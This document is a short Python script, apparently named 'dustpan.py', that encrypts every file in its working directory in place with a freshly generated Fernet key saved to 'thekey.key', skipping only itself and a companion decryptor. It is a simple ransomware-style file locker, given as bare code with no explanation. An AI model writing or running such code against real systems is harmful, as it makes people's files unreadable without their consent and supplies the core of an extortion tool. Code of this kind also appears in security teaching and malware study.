#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

dirFiles = []

for file in os.listdir():
	if file == "dustpan.py" or file == "thekey.key" or file == "decrypt-dustpan.py":
		continue
	if os.path.isfile(file):
		dirFiles.append(file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in dirFiles:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
